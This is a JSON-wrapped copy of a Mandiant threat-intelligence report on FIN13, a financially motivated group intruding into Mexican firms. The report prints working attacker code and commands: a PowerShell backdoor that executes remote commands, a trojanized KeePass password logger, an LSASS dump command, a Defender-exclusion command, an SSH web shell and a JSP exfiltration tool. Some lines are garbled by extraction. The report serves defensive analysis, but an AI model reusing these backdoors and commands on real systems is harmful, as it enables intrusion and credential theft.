{
    "id": "37e65bc2-9180-42bf-b2cf-6e5b6495cad8",
    "created_at": "2023-01-12T15:03:17.611727Z",
    "updated_at": "2025-03-27T02:17:00.36096Z",
    "deleted_at": null,
    "sha1_hash": "601f1f46ba4b55040052e3037e7f7bf48b66fa6f",
    "title": "2021-12-07 - FIN13- A Cybercriminal Threat Actor Focused on Mexico",
    "authors": "",
    "file_creation_date": "2022-05-28T21:42:27Z",
    "file_modification_date": "2022-05-28T21:42:27Z",
    "file_size": 711205,
    "plain_text": "# FIN13: A Cybercriminal Threat Actor Focused on Mexico\n\n**mandiant.com/resources/fin13-cybercriminal-mexico**\n\nBlog\n\nVan Ta, Jake Nicastro, Rufus Brown, Nick Richard\n\nDec 07, 2021\n\n25 mins read\n\nFinancial Threat Groups (FIN Groups)\n\nThreat Intelligence\n\nThreat Research\n\nMalware\n\nMexico\n\nSince 2017, Mandiant has been tracking FIN13, an industrious and versatile financially motivated threat actor conducting\n\nlong-term intrusions in Mexico with an activity timeframe stretching back as early as 2016. FIN13's operations have several noticeable\ndifferences from current cybercriminal data theft and ransomware extortion trends.\n\nAlthough their operations continue through the present day, in many ways FIN13’s intrusions are like a time capsule of traditional financial\ncybercrime from days past. Instead of today’s prevalent “smash and grab” ransomware groups, FIN13 takes their time to gather information to\nperform fraudulent money transfers. Rather than relying heavily on attack frameworks such as Cobalt Strike, the majority of FIN13 intrusions\ninvolve heavy use of custom passive backdoors and tools to lurk in environments for the long haul. In this blog post, we describe the notable\naspects of FIN13's operations to spotlight a regional cybercriminal ecosystem that deserves more exploration.\n\nA [Spanish language version of this post is available.](https://www.mandiant.com/fin13-ciberdelincuente-mexico)\n\n\n-----\n\n## FIN13 Targeting\n\nSince mid-2017, Mandiant has responded to multiple investigations which we have attributed to FIN13. In contrast to other financially\nmotivated actors, FIN13 has highly localized targeting. Over five years of Mandiant intrusion data shows FIN13 operates exclusively against\norganizations based in Mexico and has specifically targeted large organizations in the financial, retail, and hospitality industries. A review of\npublicly available financial data show several of these organizations have annual revenue in the millions to billions in U.S. dollars (1 USD =\n21.21 MXN as of December 6, 2021).\n\nFIN13 will thoroughly map a victim’s network, capturing credentials, stealing corporate documents, technical documentation, financial\ndatabases, and other files that will support their objective of financial gain through the fraudulent transfer of funds from the victim organization.\n\n## Dwell Time and Operational Lifespan\n\nMandiant investigations determined that FIN13 had a median dwell time, (defined as the duration between the start of a cyber intrusion and it\nbeing identified), of 913 days or 2 ½ years. The lengthy dwell time for a financially motivated actor is anomalous and significant for many\n[factors. In the Mandiant M-Trends 2021 report, 52% of compromises had dwell times of less than 30 days, improved from 41% in 2019: \"A](https://content.fireeye.com/m-trends/rpt-m-trends-2021)\nmajor factor contributing to the increased proportion of incidents with dwell times of 30 days or fewer is the continued surge in the proportion of\ninvestigations that involved ransomware, which rose to 25% in 2020 from 14% in 2019.\" The dwell time for ransomware investigations can be\nmeasured in days, whereas FIN13 is often present in environments for years to conduct their stealthier operations to reap as much of a reward\nas they can.\n\nMandiant clusters threat actor activity from a variety of sources, including first-hand investigations by Mandiant’s Managed Defense and\nIncident Response teams. In a review of over 850 clusters of financially motivated activity that Mandiant tracks, FIN13 shares a compelling\n[statistic with only one other threat actor: FIN10, the scourge of Canada between 2013 and 2019. A mere 2.6% of the financially motivated](https://www.mandiant.com/resources/fin10-anatomy-of-a-cyber-extortion-operation)\nthreat actors that Mandiant has tracked across multiple intrusions have targeted organizations in only a single country.\n\nWhen considering the earliest and latest dates of identified activity (“operational lifespan”) for the groups, the data gets interesting. Most of the\nfinancially motivated threat clusters Mandiant tracks have an operational lifespan of less than a year. Only ten have an operational lifespan\nbetween one and three years and four have a lifespan greater than three years. Of these four, only two of them have operated for over five\nyears: FIN10 and FIN13, which Mandiant considers rare (Figure 1).\n\nFigure 1: Financially Motivated Threat Groups with\n\nOperational Lifespans > 1 Year\nFIN13 has a demonstrated ability to remain stealthy in the networks of large, profitable Mexican organizations for a considerable length of time.\n\n## Mandiant Targeted Attack Lifecycle\n\nTargeted attacks typically follow a predictable sequence of events. Appendix A (at the bottom of the post) provides additional information on\nMandiant’s targeted attack lifecycle, which provides the major phases of a typical intrusion. Not all attacks follow the exact flow of this model;\nits purpose is to provide a visual representation of the common attack lifecycle.\n\n### Establish Foothold\n\nMandiant investigations reveal that FIN13 has primarily exploited external servers to deploy generic web shells and custom malware including\nBLUEAGAVE and SIXPACK to establish a foothold. The details of the exploits and the specific vulnerabilities targeted over the years have not\nbeen confirmed, due to insufficient evidence compounded by FIN13's long dwell times. In two separate intrusions, the earliest evidence\nsuggested a likely exploit against the victim's WebLogic server to write a generic web shell. In another, evidence suggested exploitation of\nApache Tomcat. Although details on the exact vector are sparse, FIN13 has historically used web shells on external servers as a gateway into\na victim.\n\n[The usage of JSPRAT by FIN13 allows the actor to achieve local command execution, upload/download files, and proxy network traffic for](https://advantage.mandiant.com/malware/malware--fa91b8c3-2a4a-50ef-9e49-00a01a774f15)\nadditional pivoting during later stages of the intrusion. FIN13 has also historically used publicly available web shells coded in various\nlanguages including PHP C# (ASPNET) and Java\n\n\n-----\n\n3 as a so e te s e y dep oyed t e o e S e pass e bac doo U G o ta get osts e estab s g a t a oot o d a\nenvironment. BLUEAGAVE utilizes the HttpListener .NET class to establish a local HTTP server on high ephemeral ports (65510-65512). The\nbackdoor listens for incoming HTTP requests to the root URI / on the established port, parses the HTTP request, and executes the URL\nencoded data stored within the ‘kmd’ variable of the request via the Windows Command Prompt (cmd.exe). The output of this command is\nthen sent back to the operator in the body of the HTTP response. In addition, Mandiant has identified a Perl version of BLUEAGAVE which\nallows FIN13 to establish a foothold on Linux systems. Figure 2 is sample PowerShell code from BLUEAGAVE.\n\nFigure 2: BLUEAGAVE code snippet\n\n\n-----\n\n```\n[Reflection.Assembly]::LoadWithPartialName( System.Web ) | Out-Null;\n\n```\n```\nfunction extract($request) {\n\n```\n```\n  $length = $request.contentlength64;\n\n```\n```\n  $buffer = new - object \"byte[]\" $length;\n\n```\n```\n  [void]$request.inputstream.read($buffer, 0, $length);\n\n```\n```\n  $body = [system.text.encoding]::ascii.getstring($buffer);\n\n```\n```\n  $data = @ {};\n\n```\n```\n  $body.split('&') | % {\n\n```\n```\n    $part = $_.split('=');\n\n```\n```\n    $data.add($part[0], $part[1]);\n\n```\n```\n  };\n\n```\n```\n  return $data;\n\n```\n```\n};\n\n```\n```\n$routes = @ {\n\n```\n```\n  \"POST /\" = {\n\n```\n```\n    $data = extract $context.Request;\n\n```\n```\n    $decode = [System.Web.HttpUtility]::UrlDecode($data.item('kmd'));\n\n```\n```\n    $Out = cmd.exe /c $decode 2 > &1 | Out - String;\n\n```\n```\n    return $Out;\n\n```\n```\n  }\n\n```\n```\n};\n\n```\n```\n$url = 'http://*:65510/';\n\n```\n```\n$listener = New - Object System.Net.HttpListener;\n\n```\n```\n$listener.Prefixes.Add($url);\n\n```\n```\n$listener.Start();\n\n```\n```\nwhile ($listener.IsListening) {\n\n```\n```\n  $context = $listener.GetContext();\n\n```\n```\n  $requestUrl = $context.Request.Url;\n\n```\n```\n  $response = $context.Response;\n\n```\n```\n  $localPath = $requestUrl.LocalPath;\n\n```\n```\n  $pattern = \"{0} {1}\" - f $context.Request.httpmethod, $requestUrl.LocalPath;\n\n```\n```\n  $route = $routes.Get_Item($pattern);\n\n```\n```\n  if ($route - eq $null) {\n\n```\n```\n    $response.StatusCode = 404;\n\n```\n```\n  } else {\n\n```\n```\n    $content = &$route;\n\n```\n```\n    $buffer = [System.Text.Encoding]::UTF8.GetBytes($content);\n\n```\n```\n    $response.ContentLength64 = $buffer.Length;\n\n```\n```\n    $response.OutputStream.Write($buffer, 0, $buffer.Length);\n\n```\n```\n  };\n\n```\n```\n  $response.Close();\n\n```\n```\n  $responseStatus = $response.StatusCode;\n\n```\n```\n}\n\n```\n\n-----\n\na d a t catego es pass e bac doo s as a a e t at p o des access to a ct e o e t t out act e y beaco g to a co a d\nand control server. Passive backdoors may include web shells or custom malware that accept or listen for incoming connections over a\nspecified protocol. FIN13’s usage of passive backdoors rather than commonly used active backdoors, such as BEACON, demonstrates the\nactor’s desire for stealth and sustained, long term intrusions. FIN13 also maintains active knowledge of victim networks which has allowed\nthem to effectively create complex pivots across target environments from their initial foothold. During a recent intrusion, Mandiant observed\nFIN13 leverage their foothold to chain multiple web shells together and proxy their traffic to BLUEAGAVE infected hosts in the environment.\nFigure 3 is an example logged HTTP request which demonstrates FIN13 chaining multiple web shells together from their initial foothold.\n\nFigure 3: Webshell chaining HTTP request\n```\n GET /JavaService/shell/exec?cmd=curl%20 v%20http://10.1.1.1:80/shell2/cmd.jsp%22cmd=whoami%22\n\n### Escalate Privileges\n\n```\nFIN13 primarily utilizes common privilege escalation techniques, however, the actor appears flexible to adapt when exposed to diverse victim\n[networks. FIN13 has relied on publicly available utilities, such as Windows Sysinternal's ProcDump, to obtain process memory dumps of the](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)\nLSASS system process and then used Mimikatz to parse the dumps and extract credentials. Figure 4 is an example host command used by\nFIN13 to dump the process memory of LSASS.\n\nFigure 4: LSASS memory dump command\n\n```\nC:\\Windows\\Temp\\pr64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ls.dmp\n\n```\n\nMandiant has also observed FIN13 using the legitimate Windows utility certutil, in some cases to launch obfuscated copies of utilities like\nProcDump for detection evasion. In one intrusion, FIN13 utilized certutil to decode a base64 encoded version of the custom dropper\n[LATCHKEY. LATCHKEY is a PowerShell to EXE (PS2EXE) compiled dropper that base64 decodes and executes the PowerSploit function](https://advantage.mandiant.com/malware/malware--664b9ecb-ce7b-5c5f-a67f-a2d7b72085e0)\nOut-Minidump which generates a minidump for the LSASS system process to disk.\n\nFIN13 has also used some more unique privilege escalation techniques. For example, during a recent intrusion, Mandiant observed FIN13\nreplace legitimate KeePass binaries with trojanized versions that logged newly entered passwords to a local text file. This allowed FIN13 to\ntarget and collect credentials for numerous applications to further their mission. Figure 5 is a code excerpt from the trojanized version of\nKeePass deployed by FIN13 in a client environment.\n\nFigure 5: Trojanized KeePass code snippet\n\n```\nprivate void OnBtnOK(object sender, EventArgs e)\n\n```\n```\n    {\n\n```\n```\n      using (StreamWriter streamWriter = File.AppendText(\"C:\\\\windows\\\\temp\\\\file.txt\"))\n\n```\n```\n      {\n\n```\n```\n        this.m_tbPassword.EnableProtection(false);\n\n```\n```\n        streamWriter.WriteLine(this.m_cmbKeyFile.Text + \":\" + this.m_tbPassword.Text);\n\n```\n```\n        this.m_tbPassword.EnableProtection(true);\n\n```\n```\n      }\n\n```\n```\n      if (!this.CreateCompositeKey())\n\n```\n```\n      {\n\n```\n```\n        base.DialogResult = DialogResult.None;\n\n```\n```\n      }\n\n```\n\n### Internal Reconnaissance\n\nFIN13 is particularly adept at leveraging native operating system binaries, scripts, third party tools and custom malware to conduct internal\nreconnaissance within a compromised environment. This actor appears comfortable leveraging various techniques to quickly gather\nbackground information which will support their final objectives.\n\nMandiant has observed FIN13 use common Windows commands to gather information, such as whoami to display group and privilege details\nfor their currently logged in user. For network reconnaissance they have been observed taking advantage of ping, nslookup, ipconfig, tracert,\nnetstat, and the gamut of net commands. To gather local host information, the treat actor used systeminfo, fsutil fsinfo, attrib, and extensive\nuse of the dir command.\n\n\n-----\n\n3 o ed a y o t ese eco a ssa ce e o ts to sc pts to auto ate t e p ocesses o e a p e, t ey used p bat to te ate t oug a\nlist of IP addresses in a file, execute a ping command and write the output to a file (Figure 6). A similar script used dnscmd to export a host’s\nDNS zones to a file.\n\nFigure 6: pi.bat output file contents\n\n```\n@echo off\n\n```\n```\n for /f \"tokens=*\" %%a in (C:\\windows\\temp\\ip.t) do (echo trying %%a: >>\n C:\\windows\\temp\\log4.txt ping -n 1 %%a >> C:\\windows\\temp\\log4.txt 2>&1)\n\n```\n[FIN13 has taken advantage of third-party tools, such as NMAP to support recon operations. In three FIN13 investigations, the threat actors](https://nmap.org/)\n[employed a variant of the GetUserSPNS.vbs script to identify user accounts associated with a Service Principal Name that could be targeted](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs)\nfor an attack known as “Kerberoasting” to crack the users’ passwords. They also use PowerShell to obtain additional DNS data and export it to\na file (Figure 7). Similar PowerShell code is documented in a June 2018 post to coderoad[.]ru.\n\nFigure 7: PowerShell script for DNS reconnaissance\n\n```\n$results = Get - DnsServerZone | % {\n\n```\n```\n  $zone = $_.zonename\n\n```\n```\n  Get - DnsServerResourceRecord $zone | select @ {\n\n```\n```\n    n = 'ZoneName';\n\n```\n```\n    e = {\n\n```\n```\n      $zone\n\n```\n```\n    }\n\n```\n```\n   }, HostName, RecordType, @ {\n\n```\n```\n    n = 'RecordData';\n\n```\n```\n    e = {\n\n```\n```\n      if ($_.RecordData.IPv4Address.IPAddressToString) {\n\n```\n```\n        $_.RecordData.IPv4Address.IPAddressToString\n\n```\n```\n      } else {\n\n```\n```\n        $_.RecordData.NameServer.ToUpper()\n\n```\n```\n      }\n\n```\n```\n     }\n\n```\n```\n   }\n\n```\n```\n }\n\n```\n```\n$results | Export-Csv -NoTypeInformation c:\\windows\\temp\\addcat.csv -Append\n\n```\n\nIn another instance, FIN13 executed a PowerShell script to extract login events from a host over the previous seven days. This may have been\nused to gather information and allow FIN13 to blend into normal operations for the targeted systems. Additionally, this script will help identify\nusers who have logged in, event 7001, for which there is no corresponding event 7002. The implication being that dumping LSASS could\nacquire user credentials (Figure 8). Similar PowerShell code is documented in a July 2018 post to codetwo[.]com.\n\nFigure 8: PowerShell script to extract login events\n\n\n-----\n\n```\nC:\\Windows\\system32\\cmd.exe  / c echo $hostnm = hostname;\n\n```\n```\n$logs = get-eventlog system -ComputerName $hostnm -source Microsoft-Windows-Winlogon -After (GetDate).AddDays(-7);\n$res = @();\n\n```\n```\nForEach ($log in $logs){\n if($log.instanceid -eq 7001) {$type = \"Logon\"}\n\n```\n```\n Elseif ($log.instanceid -eq 7002){$type=\"Logoff\"}\n Else {Continue} $res += New-Object PSObject -Property @{Time = $log.TimeWritten; User = (New-Object\nSystem.Security.Principal.SecurityIdentifier\n$Log.ReplacementStrings[1]).Translate([System.Security.Principal.NTAccount])}};\n\n```\n```\n$res | Out-File C:\\windows\\temp\\logs1.txt\"\n\n```\n\nAdditionally, FIN13 has taken advantage of corporate infrastructure to launch recon activities. During one investigation, FIN13 accessed the\ntarget’s Symantec Altiris console, a software and hardware management platform, to repeatedly modify an existing Run Script task in the\ninterface to acquire network and host information. In another investigation, FIN13 utilized a compromised LanDesk account to execute\ncommands to return host, network, and database information from the environment.\n\nNot limited to publicly available tooling, FIN13 has also used several custom malware families to aid in internal recon. In three investigations,\n[FIN13 used PORTHOLE, a Java-based port scanner, to conduct network research. PORTHOLE may attempt multiple socket connections to](https://advantage.mandiant.com/reports/20-00018373)\nmany IPs and ports and, as it is multi-threaded, can execute this operation rapidly with potentially multiple overlapping connections. The\nmalware accepts as its first argument either an IP address with wildcards in the address, or a filename. The second argument is the starting\nport range to scan for each IP, and the third is the ending port range.\n\n[CLOSEWATCH is a JSP web shell that communicates with a listener on localhost over a specified port, writes arbitrary files to the victim](https://advantage.mandiant.com/malware/malware--4f76ed18-0795-5475-890e-012a1f9391bf)\noperating system, executes arbitrary commands on the victim host, disables proxying and issues customizable HTTP GET requests to a range\nof remote hosts. If the proper HTTP URL parameters are specified, CLOSEWATCH can create a socket connection to localhost on port 16998\nwhere it can send and receive data using HTTP-like communications using chunked transfer-encoding. If the range parameter is specified,\nCLOSEWATCH can scan a range of IPs and ports using custom parameters. This malware was observed at one of the earliest FIN13\ninvestigations. Although a sample has recently appeared on a public repository, this malware hasn’t been observed during more recent\ninvestigations. While more than just a recon tool, CLOSEWATCH’s range parameter provides FIN13 with another scanning capability.\n\nFIN13 has been observed executing Microsoft’s osql utility, but they have also leveraged yet another JSP web shell, which Mandiant tracks as\n[SPINOFF, for SQL research. SPINOFF can execute arbitrary SQL queries on specified databases and download the results to a file. Like](https://advantage.mandiant.com/malware/malware--72e7920b-3b4e-58c0-b4cf-525ff0520d98)\nCLOSEWATCH, this malware was prevalent in early investigations.\n\n[A downloader, which Mandiant tracks as DRAWSTRING, has some internal recon functionality. While primarily providing FIN13 the ability to](https://advantage.mandiant.com/malware/malware--801245bb-9c52-5b90-bca2-30d635eba5dd)\ndownload and execute arbitrary files, DRAWSTRING will also execute systeminfo.exe and upload that information to a command and control\n(C2) server. On startup the malware creates persistence through three possible methods: a Service, a .lnk file or an update to the\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run registry key. The malware checks for the numerous anti-virus processes and varies the\npersistence method if one is found.\n\nThe malware then runs the following two commands, Figure 9 andFigure 10, where %s is replaced by the name of the program.\n\nFigure 9: PowerShell command to modify Windows Defender settings\n```\n powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"%s\"\n\n```\n\nThis Add-MpPreference command modifies settings for Windows Defender and specifies a file path to exclude from scheduled and real-time\nscanning.\n\nFigure 10: netsh command to allow DRAWSTRING communications\n```\n Netsh advfirewall firewall add rule name=\"Software Update\" profile=domain,private,public protocol=any enable=yes\n DIR=Out program=\"%s\" Action=Allow\n\n```\nThis command adds a new rule to a Windows firewall allowing DRAWSTRING outbound communications.\n\nThe malware gathers system information by executing systeminfo.exe and the Username, Computername, System Patch Information,\nProgram Files directory list, and Architecture are encrypted and base64 encoded. DRAWSTRING then performs a HTTP POST request over\nport 443 with the captured system data. While this communication uses port 443, the data is not over TLS/SSL and is not encrypted. The\nmalware makes 10 attempts to contact the C2, sleeping for 10 seconds between each round. The response is decrypted, saved, and\nexecuted\n\n\n-----\n\ne a p e ca out s ust ated gu e a d a t as obse ed 3 use t e sa e o bot a S G a d GO O C\n\nFigure 11: Example DRAWSTRING POST request\n\n```\nPOST /cpl/api.php HTTP/1.0\n\n```\n```\nContent-Type: application/x-www-form-urlencoded\n\n```\n```\nhost: <Ipv4 address>\nContent-Length: 8094\n\n```\n```\nQ=<BASE64 Encrypted Data>\n\n```\n\n### Move Laterally\n\n[The group has frequently leveraged Windows Management Instrumentation (WMI) to remotely execute commands and move laterally, namely](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)\n[by employing the native wmic command, a version of the publicly available Invoke-WMIExec script, or](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1) [WMIEXEC. Figure 12 is an example](https://advantage.mandiant.com/malware/malware--dc5a3b27-1ac2-5ffc-b4f1-3092d36ef5a5)\nWMIC command used by FIN13.\n\nFigure 12: Example WMIC command\n```\n wmic /node:\"192.168.133.61\" /user:\"<victim>\\<admin account>\" /password:<admin password> process call create\n \"powershell -noprofile -ExecutionPolicy Bypass -encodedCommand <Base64>\"\n\n```\nIn the same investigation where FIN13 has used wmiexec.vbs, Mandiant has also observed the actor use a custom JSP web shell tunneler\nnamed [BUSTEDPIPE to facilitate lateral movement via web requests.](https://advantage.mandiant.com/malware/malware--3782eac4-180e-542b-91e1-6160fb936fa7)\n\n[Mandiant has also observed FIN13 use similar utilities to Invoke-WMIExec, such as the Invoke-SMBExec PowerShell utility, at a Managed](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1)\nDefense client. Figure 13 is an example Invoke-SMBExec command used by FIN13.\n\nFigure 13: Invoke-SMBExec PowerShell command\n```\n powershell -ExecutionPolicy Bypass -command \"& { . C:\\windows\\temp\\insm.ps1; Invoke-SMBExec -Username <user>  Command 'cmd /c whoami ' -Domain CB -Hash REDACTED:REDACTED -Target <IP address> }\"\n\n```\n[NIGHTJAR is a Java uploader observed during multiple investigations that appears to be based on code found here. NIGHTJAR will listen on](https://advantage.mandiant.com/malware/malware--d744779c-4fe5-5335-8520-b4a0105f6094)\na designated socket, provided at runtime on the command line, to download a file and save it to disk. This malware does not contain a\npersistence mechanism and has been observed in the C:\\Windows\\Temp or C:\\inetpub\\wwwroot directory. Two versions of the command line\nsyntax have been observed, Figure 14 and Figure 15.\n\nFigure 14: NIGHTJAR command line syntax\n\n```\n[+] Usage: Host Port /file/to/save\n\n```\n\nFigure 15: NIGHTJAR secondary command line syntax\n\n```\n[+] Usage: Interface[localhost] Port /rout/to/save\n\n```\n\nTo move laterally cross-platform, FIN13 has used their BLUEAGAVE web shell, and two other small PHP web shells which were used to\nexecute commands remotely between Linux systems via SSH with a specified username and password. A snippet of one of these web shells\nis in Figure 16.\n\nFigure 16: SSH exec web shell\n\n\n-----\n\n```\n<?php\n\n```\n```\nerror_reporting(0);\n\n```\n```\nset_time_limit(0);\n\n```\n```\ninclude('Net/SSH2.php');\n\n```\n```\n$ip = file_get_contents('/dev/shm/22.txt');\n\n```\n```\n$command = $_REQUEST['command'];\n\n```\n```\nif($command=='')\n\n```\n```\n{\n}\n\n```\n```\nelse\n\n```\n```\n{\n\n```\n```\nforeach(preg_split(\"/((r?n)|(rn?))/\", $ip) as $ips){\n\n```\n```\n   $ssh = new Net_SSH2($ips);\n\n```\n```\n   if ($ssh->login('<REDACTED>', '<REDACTED>')) {\n\n```\n```\n      echo \"<pre>\", $ips, \"</pre><br>\";\n\n```\n```\n      echo \"<pre>\", $ssh->exec($command), \"</pre> <br>\";\n\n```\n```\n   }\n\n```\n```\n   else\n\n```\n```\n   {\n\n```\n```\n      echo \"Login Failed on $ips <br> n\";\n\n```\n```\n   }\n\n```\n```\n}\n\n```\n```\nprint \"El script ha finalizado\";\n\n```\n```\n}\n\n```\n```\n?>\n\n```\n\n### Maintain Presence\n\nEarly FIN13 intrusions involved multiple generic web shells for persistence, but over the years, FIN13 has developed a portfolio of both custom\nand publicly available malware families to use for persistence in an environment.\n\n[In multiple intrusions, FIN13 deployed SIXPACK and](https://advantage.mandiant.com/malware/malware--d597fa76-d0ac-5d0e-a3a9-f812a9ed6c9e) [SWEARJAR. SIXPACK is an ASPX web shell written in C# that functions as a tunneler.](https://advantage.mandiant.com/malware/malware--569ab4c4-958d-5c14-8723-4e48a9a479a6)\nSIXPACK accepts HTTP form data that contains a remote host and TCP port to connect to, a timeout value, and Base64-encoded data to send\nafter connecting to the specified host. Response data is read by SIXPACK and returned to the original client. SWEARJAR is a Java-based\ncross-platform backdoor that can execute shell commands.\n\n[In one instance, FIN13 deployed a backdoor called MAILSLOT, which communicates over SMTP/POP over SSL, sending and receiving emails](https://advantage.mandiant.com/malware/malware--7bdf05d8-eb5c-59ae-8f94-4032efc6fbd7)\nto and from a configured attacker-controlled email account for its command and control. MAILSLOT makes FIN13 a rare case of a threat actor\nwho has used email communications for C2.\n\n[They have also employed a custom utility Mandiant named HOTLANE, which is a tunneler written in C/C++ that can operate in client or server](https://advantage.mandiant.com/malware/malware--a2c05faf-4a10-5bb9-9353-5c201aac3956)\nmode and communicates with a custom binary protocol over TCP.\n\n[On top of their custom malware, FIN13 has used publicly available malware such as the GOBOT2 backdoor and TINYSHELL.](https://github.com/SaturnsVoid/GoBot2)\n\n[One unique publicly available utility the actor has used is a PHP webshell based on PHPSPY, which Mandiant tracks as SHELLSWEEP, which](https://gist.github.com/EstebanFuentealba/182be17887e1838c56ef)\ncontained functionality to retrieve credit card information. Figure 17 contains a snippet of the PHP web shell.\n\nFigure 17: PCI-related code snippet from publicly available PHP webshell\n\n\n-----\n\n```\n$level = 1;\n\n```\n```\nif (isset($_GET['level'])) $level = $_GET['level'];\n\n```\n```\n $firmas = array(\"Estandar eval(base64_decode())\" = > \"/eval\\s*\\(\\s*base64_decode\\(\\s*/\", \"eval(gzinflate(base64_decode\n = > \"/eval\\s*\\(gzinflate\\s*\\(\\s*base64_decode\\s*\\(\\s*/\", \"D4NB4R WAS HERE\" = > \"/D4NB4R WAS HERE/\", \"md5(Safety)\" = >\n \"/6472ce41c26babff27b4c28028093d77/\", \"md5(backdoor1)\" = > \"/f32e7903a13ff43da2ef1baf36adeca9/\", \"WSO 2.1 (Web Shell by\n oRb)\" = > \"/10b27b168be0f7e90496dbc5fcfa63fc/\", \"WSO 2.1 (Web Shell by oRb) 2\" = > \"/Web Shell by oRb/\", \"milw0rm.com\"\n \"/milw0rm\\.com/\", \"exploit-db.com\" = > \"/exploit-db\\.com/\", \"FilesMan\" = > \"/preg_replace\\s*\\(\\s*(\\\"|')\\/\\.\\*\\/e(\\\"|')/\n \"CMD\" = > '/(system|exec|passthru)\\(\\s*\\$_GET\\[([^\\w\\d]|\\\"|\\')*cmd([^\\w\\d]|\"|\\')*\\]\\s*\\)/', \"CC's\n dump\"=>\"/num_tarjeta,codigo_sec,fecha_expira/i\",\"root 12345\"=>\"/'root','12345'/i\",);$level2=array(\"Pasarela\n (VPCPaymentConnection)\"=>\"/VPCPaymentConnection/\",\"setSecureSecret(__GROUP__)\"=>\"/setSecureSecret\\s*\\(\\s*\n (.+?)\\s*\\)/\",\"__GROUP____PARSE_ARGS__\"=>\"/((ifx_connect|oci_connect|mysql_connect|pg_connect|mssql_connect|odbc_connect\n (\\s*.+?\\s*\\)\\s*;)/i\");if(intval($level)>1){$firmas=array_merge($firmas,$level2);}$level3=array(\"CC's (__GROUP__)\" = >\n \"/[^\\w](cc_?num(ber)?|credit_?card|cod_?sec|cvv|num_?cad|num_?exp|tarjeta|numero_?tarjeta|vence_?mes|vence_?\n ano|c_seg|exp_code?)[^\\w]/i\", \"Visa CC's (__GROUP__)\"=>\"/[^\\d\\w]((?:4[0-9]{12}(?:[0-9]{3})?)[^\\d\\w]/\",\"MasterCard CC's\n (__GROUP__)\" = > \"/[^\\d\\w](5[1-5][0-9]{14})[^\\d\\w]/\", \"American Express CC's (__GROUP__)\" = > \"/([^\\d\\w]3[47][0-9]{13}\n [^\\d\\w])/\");\n\n```\nTo persistently execute their backdoors, FIN13 has used Windows Registry run keys such as\nHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\hosts which was configured to execute a file\nlocated at C:\\WINDOWS\\hosts.exe. They have also created scheduled tasks with names such as acrotryr and AppServicesr to execute\nbinaries of the same name in the C:\\Windows directory.\n\n## Complete Mission\n\nWhile many organizations are inundated with ransomware, FIN13 nostalgically monetizes their intrusions through targeted data theft to enable\nfraudulent transactions. FIN13 has exfiltrated commonly targeted data such as LSASS process dumps and registry hives, but ultimately\ntargeted users effective towards their financial goals. In one intrusion, FIN13 specifically enumerated all users and roles from the victim's main\ntreasury system. FIN13 then moved further into sensitive parts of the network, including POS and ATM networks, where they could exfiltrate a\nrange of highly targeted data.\n\nAt one victim, FIN13 exfiltrated files related to Verifone, a commonly used software that facilitates money transfers on POS systems. In at least\none case, FIN13 exfiltrated the entire base folder for a POS system which included file dependencies, images used for printing receipts, and\n.wav files used for sound effects. At a different victim, FIN13 similarly stole dependency files for the victim's ATM terminal software. The\ninformation stolen from systems important to a monetary transaction could be used to illuminate potential avenues for fraudulent activity.\n\nFIN13 also interacted with databases to gather financially sensitive information. In one victim database, FIN13 retrieved contents of the\nfollowing tables for exfiltration:\n\n\"claves_retiro\" (English translation \"withdrawal keys\")\n\"codigos_retiro_sin_tarjeta\" (English translation \"keyless card withdrawal codes\")\n\"retirosefectivo\" (English translation \"cash withdrawal\")\n\nWith treasures in hand, FIN13 masqueraded their staged data by using the Windows certutil utility to generate a fake, Base64 encoded\ncertificate with the input file. The certificate contained the content of the archive file (Figure 18), prepared for exfiltration with normal certificate\nbeginning and end statements.\n\nFigure 18: Staged archive data in certificate\n\n```\n-----BEGIN CERTIFICATE----\n```\n```\nUmFyIRoHAM+QcwAADQAAAAAAAABtB3TAkEgADWsDAV5qvgMCpojeh0SF+EodMyMA\nIAAAAFVzZXJzXGFkbV9zcWxcQXBwRGF0YVxSb2FtaW5nXGwuZG1wALDbslQiIdVV\n\n```\n```\n[truncated]\n\n```\n```\n54Mt/3107vXRoa10YPmXffXCPQ+LF4vq3vhdKn+Z+tdaYeD/IgueHaxaff6yZMmT\n\n```\n```\nJkyZMmTepv/ExD17AEAHAA==\n\n```\n```\n-----END CERTIFICATE----\n```\n\nFIN13 then exfiltrated the data via web shells previously deployed in the environment or using a simple JSP tool (Figure 19) in a web\naccessible directory.\n\nFigure 19: Example JSP used for data theft\n\n\n-----\n\n```\n<%@ page buffer= none %>\n<%@page import=\"java.io.*\"%>\n\n```\n```\n<%String down=\"I:\\\\[attacker created dir]\\\\[attacker created archive]\";\n   if(down!=null){\n\n```\n```\n   response.setContentType(\"APPLICATION/OCTET-STREAM\");\n   response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\" + down + \"\\\"\");\n\n```\n```\n   FileInputStream fileInputStream=new FileInputStream(down);\n   int i;\n\n```\n```\n   while ((i=fileInputStream.read()) != -1) {\n\n```\n```\n    out.write(i);}fileInputStream.close();}%>\n\n```\nAlthough FIN13 targeted specific data that could aide fraudulent transactions, we were not always able to witness firsthand how FIN13\ncapitalized on the stolen information. At one victim, we were able to recover a tool, named GASCAN, that gave us visibility into their endgame.\n\nGASCAN is Java based malware that processes point-of-sale data and sends specially crafted messages to a command-line specified remote\nserver. The data sent contains a value that corresponds to one of two different [ISO 8583 message types and can be used to construct](https://sites.google.com/site/paymentsystemsblog/iso8583-financial-transaction-message-format)\nfraudulent ISO 8583 transactions. The first message type, 0100, indicates data corresponding to an authorization message and is used to\ndetermine if funds are available on a specific account. After receiving the first message, the C2 server returns a buffer that includes the string\n“Aprobada”, which translates to “Approved”. The second message type, 0200, contains data used for a financial request message and is used\nto post a charge to a specific account. The second message structure includes a field called “monto”, which translates to “amount”. The value\nof “monto” is calculated using an internal function that returns a randomly generated number between 2000 and 3000, used as the transaction\namount sent in the second message. Based on the information sent, it is likely that the specified remote server is responsible for formatting\nand sending the ISO 8583 message for fraudulent 